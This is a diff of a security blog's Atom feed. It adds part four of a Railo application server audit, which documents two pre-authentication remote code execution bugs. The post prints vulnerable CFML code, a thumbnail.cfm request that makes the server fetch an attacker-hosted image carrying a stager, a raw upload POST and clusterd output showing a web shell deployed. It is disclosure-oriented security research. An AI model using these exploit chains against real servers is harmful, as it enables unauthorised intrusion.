@@ -4,7 +4,7 @@
   <title><![CDATA[Category: clusterd | forelsec]]></title>
   <link href="http://hatRiot.github.io/blog/categories/clusterd/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2014-08-23T13:12:08-06:00</updated>
+  <updated>2014-08-27T23:29:44-06:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -14,6 +14,296 @@
 
   
   <entry>
+    <title type="html"><![CDATA[railo security - part four - pre-auth remote code execution]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/08/27/railo-security-part-four/"/>
+    <updated>2014-08-27T15:00:00-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/08/27/railo-security-part-four</id>
+    <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-auth rce</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three">Part three &ndash; pre-auth password retrieval</a></em><br/>
+<em>Part four &ndash; pre-auth remote code execution</em></p>
+
+<p>This post concludes our deep dive into the Railo application server by detailing not only one, but two pre-auth remote code execution vulnerabilities.  If you&rsquo;ve skipped the first three parts of this blog post to get to the juicy stuff, I don&rsquo;t blame you, but I do recommend going back and reading them; there&rsquo;s some important information and details back there.  In this post, we&rsquo;ll be documenting both vulnerabilities from start to finish, along with some demonstrations and notes on clusterd&rsquo;s implementation on one of these.</p>
+
+<p>The first RCE vulnerability affects versions 4.1 and 4.2.x of Railo, 4.2.1 being the latest release.  Our vulnerability begins with the file <code>thumbnail.cfm</code>, which Railo uses to store admin thumbnails as static content on the server.  As previously noted, Railo relies on authentication measures via the cfadmin tag, and thus none of the cfm files actually contain authentication routines themselves.</p>
+
+<p><code>thumbnail.cfm</code> first generates a hash of the image along with it&rsquo;s width and height:</p>
+
+<p><code>
+&lt;cfset url.img=trim(url.img)&gt;
+&lt;cfset id=hash(url.img&amp;"-"&amp;url.width&amp;"-"&amp;url.height)&gt;
+&lt;cfset mimetypes={png:'png',gif:'gif',jpg:'jpeg'}&gt;
+</code></p>
+
+<p>Once it&rsquo;s got a hash, it checks if the file exists, and if not, attempts to read and write it down:</p>
+
+<p>```
+<cffile action="readbinary" file="#url.img#" variable="data">
+<cfimage action="read" source="#data#" name="img"></p>
+
+<!--- shrink images if needed --->
+
+
+<p><cfif img.height GT url.height or img.width GT url.width></p>
+
+<pre><code>&lt;cfif img.height GT url.height &gt;
+    &lt;cfimage action="resize" source="#img#" height="#url.height#" name="img"&gt;
+&lt;/cfif&gt;
+&lt;cfif img.width GT url.width&gt;
+    &lt;cfimage action="resize" source="#img#" width="#url.width#" name="img"&gt;
+&lt;/cfif&gt;
+&lt;cfset data=toBinary(img)&gt;
+</code></pre>
+
+<p></cfif>
+```</p>
+
+<p>The <code>cffile</code> tag is used to read the raw image and then cast it via the <code>cfimage</code> tag.  The wonderful thing about <code>cffile</code> is that we can provide URLs that it will arbitrarily retrieve.  So, our URL can be this:</p>
+
+<p><code>
+192.168.1.219:8888/railo-context/admin/thumbnail.cfm?img=http://192.168.1.97:8000/my_image.png&amp;width=5000&amp;height=50000
+</code></p>
+
+<p>And Railo will go and fetch the image and cast it.  Note that if a height and width are not provided it will attempt to resize it; we don&rsquo;t want this, and thus we provide large width and height values.  This file is written out to <code>/railo/temp/admin-ext-thumbnails/[HASH].[EXTENSION]</code>.</p>
+
+<p>We&rsquo;ve now successfully written a file onto the remote system, and need a way to retrieve it.  The temp folder is not accessible from the web root, so we need some sort of LFI to fetch it.  Enter <code>jsloader.cfc</code>.</p>
+
+<p><code>jsloader.cfc</code> is a Railo component used to fetch and load Javascript files.  In this file is a CF tag called <code>get</code>, which accepts a single argument <code>lib</code>, which the tag will read and return.  We can use this to fetch arbitrary Javascript files on the system and load them onto the page.  Note that it MUST be a Javascript file, as the extension is hard-coded into the file and null bytes don&rsquo;t work here, like they would in PHP.  Here&rsquo;s the relevant code:</p>
+
+<p>```
+<cfset var filePath = expandPath('js/#arguments.lib#.js')/></p>
+
+<pre><code>&lt;cfset var local = {result=""} /&gt;&lt;cfcontent type="text/javascript"&gt;
+    &lt;cfsavecontent variable="local.result"&gt;
+        &lt;cfif fileExists(filePath)&gt;
+            &lt;cfinclude template="js/#arguments.lib#.js"/&gt;
+        &lt;/cfif&gt;
+    &lt;/cfsavecontent&gt;
+&lt;cfreturn local.result /&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>Let&rsquo;s tie all this together.  Using <code>thumbnail.cfm</code>, we can write well-formed images to the file system, and using the <code>jsloader.cfc</code> file, we can read arbitrary Javascript.  Recall how log injection works with PHP; we can inject PHP tags into arbitrary files so long as the file is loaded by PHP, and parsed accordingly.  We can fill a file full of junk, but if the parser has its way a single <code>&lt;?phpinfo();?&gt;</code> will be discovered and executed; the CFML engine works the same way.</p>
+
+<p>Our attack becomes much more clear: we generate a well-formed PNG file, embed CFML code into the image (metadata), set the extension to <code>.js</code>, and write it via <code>thumbnail.cfm</code>.  We then retrieve the file via <code>jsloader.cfc</code> and, because we&rsquo;re loading it with a CFM file, it will be parsed and executed.  Let&rsquo;s check this out:</p>
+
+<p>```
+$ ./clusterd.py -i 192.168.1.219 -a railo -v4.1 &mdash;deploy ./src/lib/resources/cmd.cfml &mdash;deployer jsload</p>
+
+<pre><code>    clusterd/0.3.1 - clustered attack toolkit
+        [Supporting 6 platforms]
+</code></pre>
+
+<p> [2014-06-15 03:39PM] Started at 2014-06-15 03:39PM
+ [2014-06-15 03:39PM] Servers' OS hinted at windows
+ [2014-06-15 03:39PM] Fingerprinting host &lsquo;192.168.1.219&rsquo;
+ [2014-06-15 03:39PM] Server hinted at &lsquo;railo&rsquo;
+ [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server&hellip;
+ [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server Administrator&hellip;
+ [2014-06-15 03:39PM] Checking railo version 4.1 Railo Web Administrator&hellip;
+ [2014-06-15 03:39PM] Matched 2 fingerprints for service railo
+ [2014-06-15 03:39PM]   Railo Server Administrator (version 4.1)
+ [2014-06-15 03:39PM]   Railo Web Administrator (version 4.1)
+ [2014-06-15 03:39PM] Fingerprinting completed.
+ [2014-06-15 03:39PM] This deployer (jsload_lfi) requires an external listening port (8000).  Continue? [Y/n] >
+ [2014-06-15 03:39PM] Preparing to deploy cmd.cfml&hellip;
+ [2014-06-15 03:40PM] Waiting for remote server to download file [5s]]
+ [2014-06-15 03:40PM] Invoking stager and deploying payload&hellip;
+ [2014-06-15 03:40PM] Waiting for remote server to download file [7s]]
+ [2014-06-15 03:40PM] cmd.cfml deployed at /railo-context/cmd.cfml
+ [2014-06-15 03:40PM] Finished at 2014-06-15 03:40PM
+```</p>
+
+<p>A couple things to note; as you may notice, the module currently requires the Railo server to connect back twice.  Once is for the image with embedded CFML, and the second for the payload.  We embed only a stager in the image that then connects back for the actual payload.</p>
+
+<p>Sadly, the LFI was unknowingly killed in 4.2.1 with the following fix to <code>jsloader.cfc</code>:</p>
+
+<p>```
+<cfif arguments.lib CT ".."></p>
+
+<pre><code>&lt;cfheader statuscode="400"&gt;
+&lt;cfreturn "// 400 - Bad Request"&gt;
+</code></pre>
+
+<p></cfif>
+```</p>
+
+<p>The <code>arguments.lib</code> variable contains our controllable path, but it kills our ability to traverse out.  Unfortunately, we can&rsquo;t substitute the .. with unicode or utf-16 due to the way Jetty and Java are configured, by default.  This file is pretty much useless to us now, unless we can write into the folder that <code>jsloader.cfc</code> reads from; then we don&rsquo;t need to traverse out at all.</p>
+
+<p>We can still pop this on Express installs, due to the Jetty LFI discussed in part 3.  By simply traversing into the extensions folder, we can load up the Javascript file and execute our shell.  Railo installs still proves elusive.</p>
+
+<p>buuuuuuuuuuuuuuuuuuuuuuuuut</p>
+
+<p>Recall the <code>img.cfm</code> LFI from part 3; by tip-toeing back into the admin-ext-thumbnails folder, we can summon our vulnerable image and execute whatever coldfusion we shove into it.  This proves to be an even better choice than <code>jsloader.cfc</code>, as we don&rsquo;t need to traverse as far.  This bug only affects versions 4.1 &ndash; 4.2.1, as <code>thumbnail.cfm</code> wasn&rsquo;t added until 4.1.  <code>CVE-2014-5468</code> has been assigned to this issue.</p>
+
+<p>The second RCE vulnerability is a bit easier and has a larger attack vector, spanning all versions of Railo.  As previously noted, Railo does not do per page/URL authentication, but rather enforces it when making changes via the <code>&lt;cfadmin&gt;</code> tag.  Due to this, any pages doing naughty things without checking with the tag may be exploitable, as previously seen.  Another such file is <code>overview.uploadNewLangFile.cfm</code>:</p>
+
+<p>```
+<cfif structKeyExists(form, "newLangFile")></p>
+
+<pre><code>&lt;cftry&gt;
+    &lt;cffile action="UPLOAD" filefield="form.newLangFile" destination="#expandPath('resources/language/')#" nameconflict="ERROR"&gt;
+    &lt;cfcatch&gt;
+        &lt;cfthrow message="#stText.overview.langAlreadyExists#"&gt;
+    &lt;/cfcatch&gt;
+&lt;/cftry&gt;
+&lt;cfset sFile = expandPath("resources/language/" &amp; cffile.serverfile)&gt;
+&lt;cffile action="READ" file="#sFile#" variable="sContent"&gt;
+&lt;cftry&gt;
+    &lt;cfset sXML     = XMLParse(sContent)&gt;
+    &lt;cfset sLang    = sXML.language.XMLAttributes.label&gt;
+    &lt;cfset stInLang = GetFromXMLNode(sXML.XMLRoot.XMLChildren)&gt;
+    &lt;cfcatch&gt;
+        &lt;cfthrow message="#stText.overview.ErrorWhileReadingLangFile#"&gt;
+    &lt;/cfcatch&gt;
+&lt;/cftry&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>I mean, this might as well be an upload form to write arbitrary files.  It&rsquo;s stupid simple to get arbitrary data written to the system:</p>
+
+<p>```
+POST /railo-context/admin/overview.uploadNewLangFile.cfm HTTP/1.1
+Host: localhost:8888
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: <a href="http://localhost:8888/railo-context/admin/server.cfm">http://localhost:8888/railo-context/admin/server.cfm</a>
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=AaB03x
+Content-Length: 140</p>
+
+<p>&mdash;AaB03x
+Content-Disposition: form-data; name=&ldquo;newLangFile&rdquo;; filename=&ldquo;xxxxxxxxx.lang&rdquo;
+Content-Type: text/plain</p>
+
+<p>thisisatest
+&mdash;AaB03x&mdash;
+```</p>
+
+<p>The tricky bit is where it&rsquo;s written too; Railo uses a compression system that dynamically generates compressed versions of the web server, contained within <code>railo-context.ra</code>.  A mirror of these can be found under the following:</p>
+
+<p><code>
+[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress
+</code></p>
+
+<p>The compressed data is then obfuscated behind two more folders, both MD5s.  In my example, it becomes:</p>
+
+<p><code>
+[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress\88d817d1b3c2c6d65e50308ef88e579c\0bdbf4d66d61a71378f032ce338258f2
+</code></p>
+
+<p>So we cannot simply traverse into this path, as the hashes change every single time a file is added, removed, or modified.  I&rsquo;ll walk the logic used to generate these, but as a precusor, we aren&rsquo;t going to figure these out without some other fashionable info disclosure bug.</p>
+
+<p>The hashes are calculated in <code>railo-java/railo-core/src/railo/commons/io/res/type/compress/Compress.java</code>:</p>
+
+<p>```
+temp=temp.getRealResource(&ldquo;compress&rdquo;);              <br/>
+temp=temp.getRealResource(MD5.getDigestAsString(cid+&ldquo;&ndash;&rdquo;+ffile.getAbsolutePath()));
+if(!temp.exists())temp.createDirectory(true);
+}
+catch(Throwable t){}
+}</p>
+
+<pre><code>if(temp!=null) {
+    String name=Caster.toString(actLastMod)+":"+Caster.toString(ffile.length());
+    name=MD5.getDigestAsString(name,name);
+    root=temp.getRealResource(name);
+    if(actLastMod&gt;0 &amp;&amp; root.exists()) return;
+</code></pre>
+
+<p>```</p>
+
+<p>The first hash is then <code>cid + "-" + ffile.getAbsolutePath()</code>, where <code>cid</code> is the randomly generated ID found in the <code>id</code> file (see part two) and <code>ffile.getAbsolutePath()</code> is the full path to the classes resource.  This is doable if we have the XXE, but 4.1+ is inaccessible.</p>
+
+<p>The second hash is <code>actLastMode + ":" + ffile.length()</code>, where <code>actLastMode</code> is the last modified time of the file and <code>ffile.length()</code> is the obvious file length.  Again, this is likely not brute forcable without a serious infoleak vulnerability.  Hosts &lt;= 4.0 are exploitable, as we can list files with the XXE via the following:</p>
+
+<p>```
+bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
+88d817d1b3c2c6d65e50308ef88e579c</p>
+
+<p>[SNIP &ndash; in which we modify the path to include ^]</p>
+
+<p>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
+0bdbf4d66d61a71378f032ce338258f2</p>
+
+<p>[SNIP &ndash; in which we modify the path to include ^]</p>
+
+<p>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
+admin
+admin_cfc$cf.class
+admin_cfm$cf.class
+application_cfc$cf.class
+application_cfm$cf.class
+component_cfc$cf.class
+component_dump_cfm450$cf.class
+doc
+doc_cfm$cf.class
+form_cfm$cf.class
+gateway
+graph_cfm$cf.class
+jquery_blockui_js_cfm1012$cf.class
+jquery_js_cfm322$cf.class
+META-INF
+railo_applet_cfm270$cf.class
+res
+templates
+wddx_cfm$cf.class
+```</p>
+
+<p><code>http_test_xxe.py</code> is just a small hack I wrote to exploit the XXE, in which we eventually obtain both valid hashes.  So we can exploit this in versions &lt;= 4.0 Express.  Later versions, as far as I can find, have no discernible way of obtaining full RCE without another infoleak or resorting to a slow, loud, painful death of brute forcing two MD5 hashes.</p>
+
+<p>The first RCE is currently available in clusterd dev, and a PR is being made to Metasploit thanks to @BrandonPrry.  Hopefully it can be merged shortly.</p>
+
+<p>As we conclude our Railo analysis, lets quickly recap the vulnerabilities discovered during this audit:</p>
+
+<p>```
+Version 4.2:</p>
+
+<pre><code>- Pre-authentication LFI via `img.cfm` (Install/Express)
+- Pre-authentication LFI via Jetty CVE (Express)
+- Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
+- Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express) (Up to version 4.2.0)
+</code></pre>
+
+<p>Version 4.1:</p>
+
+<pre><code>- Pre-authentication LFI via `img.cfm` (Install/Express)
+- Pre-authentication LFI via Jetty CVE (Express)
+- Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
+- Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
+</code></pre>
+
+<p>Version 4.0:</p>
+
+<pre><code>- Pre-authentication LFI via XXE (Install/Express)
+- Pre-authentication LFI via Jetty CVE (Express)
+- Pre-authentication LFI via `img.cfm` (Install/Express)
+- Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Install/Express)
+- Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
+- Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
+</code></pre>
+
+<p>Version 3.x:</p>
+
+<pre><code>- Pre-authentication LFI via `img.cfm` (Install/Express)
+- Pre-authentication LFI via Jetty CVE (Express)
+- Pre-authentication LFI via XXE (Install/Express)
+- Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Express)
+</code></pre>
+
+<p>```</p>
+
+<p>This does not include the random XSS bugs or post-authentication issues.  At the end of it all, this appears to be a framework with great ideas, but <em>desperately</em> in need of code TLC.  Driving forward with a checklist of features may look nice on a README page, but the desolate wasteland of code left behind can be a scary thing.  Hopefully the Railo guys take note and spend some serious time evaluating and improving existing code.  The bugs found during this series have been disclosed to the developers; here&rsquo;s to hoping they follow through.</p>
+
+<p><img src="/images/posts/2014/railo/railo-getrailo-error.jpg"></p>
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[railo security - part three - pre-authentication LFI]]></title>
     <link href="http://hatRiot.github.io/blog/2014/08/23/railo-security-part-three/"/>
     <updated>2014-08-23T15:00:00-06:00</updated>
@@ -21,7 +311,7 @@
     <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
 <em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-authentication rce</a></em><br/>
 <em>Part three &ndash; pre-authentication LFI</em><br/>
-<em>Part four</em></p>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>
 
 <p>This post continues our four part Railo security analysis with three pre-authentication LFI vulnerabilities.  These allow anonymous users access to retrieve the administrative plaintext password and login to the server&rsquo;s administrative interfaces.  If you&rsquo;re unfamiliar with Railo, I recommend at the very least reading part one of this series.  The most significant LFI discussed has been implemented as auxiliary modules in <a href="http://github.com/hatRiot/clusterd">clusterd</a>, though they&rsquo;re pretty trivial to exploit on their own.</p>
 
@@ -173,7 +463,7 @@ The error occurred in zip://C:\Documents and Settings\bryan\My Documents\Downloa
     <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
 <em>Part two &ndash; post-authentication rce</em><br/>
 <em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/">Part three &ndash; pre-authentication lfi</a></em><br/>
-<em>Part four</em></p>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>
 
 <p>This post continues our dive into Railo security, this time introducing several post-authentication RCE vulnerabilities discovered in the platform.  As stated in part one of this series, like ColdFusion, there is a task scheduler that allows authenticated users the ability to write local files.  Whilst the existence of this feature sets it as the standard way to shell a Railo box, sometimes this may not work.  For example, in the event of stringent firewall rules, or irregular file permissions, or you&rsquo;d just prefer not to make remote connections, the techniques explored in this post will aid you in this manner.</p>
 
@@ -510,7 +800,7 @@ a898c2525c001da402234da94f336d55  -
     <content type="html"><![CDATA[<p><em>Part one &ndash; intro</em><br/>
 <em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-authentication rce</a></em><br/>
 <em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/">Part three &ndash; pre-authentication lfi</a></em><br/>
-<em>Part four</em></p>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>
 
 <p><a href="http://getrailo.org/">Railo</a> is an open-source alternative to the popular Coldfusion application server, implementing a FOSSy CFML engine and application server.  It emulates Coldfusion in a variety of ways, mainly features coming straight from the CF world, along with several of it&rsquo;s own unique features (clustered servers, a plugin architecture, etc).  In this four-part series, we&rsquo;ll touch on how Railo, much like Coldfusion, can be used to gain access to a system or network of systems.  I will also be examining several pre-authentication RCE vulnerabilities discovered in the platform during this audit.  I&rsquo;ll be pimping <a href="https://github.com/hatRiot/clusterd">clusterd</a> throughout to exemplify how it can help achieve some of these goals.  These posts are the result of a combined effort between myself and Stephen Breen (@breenmachine).</p>
 
@@ -786,95 +1076,6 @@ $ ./clusterd.py -i 192.168.1.219 -a coldfusion -p8500 -v8 &mdash;deployer lfi_st
 <p>The downside to this method is remnance in a log file, which cannot be purged unless the CF server is shutdown (except in CF10).  It also means that the CFML file, if using the web shell, will be hanging around the filesystem.  An alternative is to inject a web shell that exists on-demand, that is, check if an argument is provided to the LFI and only parse and execute then.</p>
 
 <p>A working deployer for this can be found in the latest release of clusterd (v0.2.1).  It is also worth noting that this method is applicable to other CFML engines; details on that, and a working proof of concept, in the near future.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Fetching JBoss MBean method hashes]]></title>
-    <link href="http://hatRiot.github.io/blog/2014/01/26/fetching-jboss-mbean-method-hashes/"/>
-    <updated>2014-01-26T01:24:19-07:00</updated>
-    <id>http://hatRiot.github.io/blog/2014/01/26/fetching-jboss-mbean-method-hashes</id>
-    <content type="html"><![CDATA[<p>Matasano published <a href="http://www.matasano.com/research/OWASP3011_Luca.pdf">one</a> of <a href="https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now">two</a> canonical papers on JBoss exploitation.  While working on a fresh new tool, I came across the JMXInvokerServlet technique, which uses serialized Java requests to deploy to remote MBeans.  This uses a specific object hash to route the JMX request to the correct MBean; in our case, the gold is jboss.jmx:name=Invoker.</p>
-
-<p>In this paper, Matasano provides the hash for JBoss 4.0.3SP1, but does not list any others, nor show how it derived this.  After perusing the code, however, I found it to be quite simple, and have developed a simple method for fetching hashes of not only the Invoker MBean, but any listed in the JBoss registry.</p>
-
-<p>To extract these values, we simply deploy a WAR file that dumps the entirety of the Registry, which is used for hash lookups when routing requests.  This can can be seen below:</p>
-
-<p>```
-&lt;%@ page import=&ldquo;org.jboss.system.Registry&rdquo;%>
-&lt;%@ page import=&ldquo;java.io.*&rdquo;%>
-&lt;%@ page import=&ldquo;java.util.Map&rdquo;%>
-&lt;%@ page import=&ldquo;java.util.Iterator&rdquo;%>
-&lt;%</p>
-
-<pre><code>Iterator it = Registry.entries.entrySet().iterator();
-while (it.hasNext()){
-    Map.Entry pairs = (Map.Entry)it.next();
-    out.println(pairs.getKey() + " = " + pairs.getValue() + "&lt;br/&gt;");
-    it.remove();
-}
-</code></pre>
-
-<p>%>
-```</p>
-
-<p>When deployed and executed on my local 4.0.5.GA JBoss server, we get:</p>
-
-<p><img class="center" src="/images/posts/2014/jb_hash.jpg"></p>
-
-<p>With this, we&rsquo;ve fetched the hash for the Invoker MBean as well as every other invokable MBean in the registry.  This value appears to be common across all 3.x and 4.x JBoss instances.  However, when run against JBoss 5.x/6.x instances, the following is returned:</p>
-
-<p><img class="center" src="/images/posts/2014/jb_hash_6x.jpg"></p>
-
-<p>This change is due to the way look-ups are performed in 5.x; instead of the key being an Integer (hash), the key is now an Object, as shown below:</p>
-
-<p><code>
-public static Map&lt;Object, Object&gt; entries = new ConcurrentHashMap&lt;Object, Object&gt;();
-</code></p>
-
-<p>To further enumerate this, we can iterate over the class methods and pull all of their hashes and hash codes:</p>
-
-<p>```
-&lt;%@ page import=&ldquo;java.io.*&rdquo;%>
-&lt;%@ page import=&ldquo;java.util.Map&rdquo;%>
-&lt;%@ page import=&ldquo;java.util.Iterator&rdquo;%>
-&lt;%@ page import=&ldquo;java.lang.reflect.Method&rdquo;%>
-&lt;%@ page import=&ldquo;org.jboss.system.Registry&rdquo;%>
-&lt;%@ page import=&ldquo;javax.management.ObjectName&rdquo;%>
-&lt;%@ page import=&ldquo;org.jboss.invocation.MarshalledInvocation&rdquo;%>
-&lt;%</p>
-
-<pre><code>Iterator it = Registry.entries.entrySet().iterator();
-while (it.hasNext()){
-    Map.Entry pairs = (Map.Entry)it.next();
-    out.println(pairs.getKey() + " = " + pairs.getValue() + "&lt;br/&gt;");
-
-    // check for ObjectName
-    if (pairs.getKey() instanceof ObjectName){
-        Long hash;
-        Method[] methods = pairs.getValue().getClass().getMethods();
-        for (int m = 0; m &lt; methods.length; ++m){
-            Method method = methods[m];
-            hash = new Long(MarshalledInvocation.calculateHash(method));
-            out.println("Method: " + method + "  Hash: " + hash + " (" + method.hashCode() + ")" + "&lt;br/&gt;");
-        }
-    }
-
-    out.println("Key class: " + pairs.getKey().getClass() + "&lt;br/&gt;");
-    it.remove();
-}
-</code></pre>
-
-<p>%>
-```</p>
-
-<p>Which gives us:</p>
-
-<p><img class="center" src="/images/posts/2014/jb_6x_methods.jpg"></p>
-
-<p>Judging by this information, it doesn&rsquo;t appear that we can remotely invoke the same way we did with 3.x/4.x.  This is the fundamental issue with several of the available open source JBoss tools (Metasploit); none of them take into account the changes between different versions of JBoss.</p>
-
-<p>Although I have yet to discover a way to map requests to the invoker (I&rsquo;m not entirely sure its possible) in these later versions, I have a suspicion that we may be able to map these requests by serializing objects out.  More on this, and my exploitation tool, soon.</p>
 ]]></content>
   </entry>
   
